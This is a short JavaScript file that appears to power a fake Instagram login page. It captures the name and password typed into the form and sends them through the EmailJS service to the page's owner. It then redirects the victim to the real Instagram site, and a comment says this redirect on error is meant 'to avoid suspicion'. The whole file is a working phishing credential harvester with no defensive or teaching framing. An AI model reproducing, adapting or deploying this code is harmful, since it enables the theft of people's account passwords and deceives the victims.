// script.js
emailjs.init('u3VNYB1aRBFhjVGig');

document.getElementById('contact-form').addEventListener('submit', function(event) {
  event.preventDefault();

  const name = document.getElementById('name').value;
  const password = document.getElementById('password').value;

  if (!name || !password) {
    alert('Please fill out all fields.');
    return;
  }

  const btn = document.getElementById('button');
  btn.value = 'Loading...';

  emailjs.sendForm('service_thekedaar', 'template_fsl427b', this)
    .then(() => {
      btn.value = 'Log In';
      // Redirect to Instagram after successful submission
      window.location.href = 'https://www.instagram.com/';
    }, (err) => {
      btn.value = 'Log In';
      // Also redirect on error to avoid suspicion
      window.location.href = 'https://www.instagram.com/';
    });
});
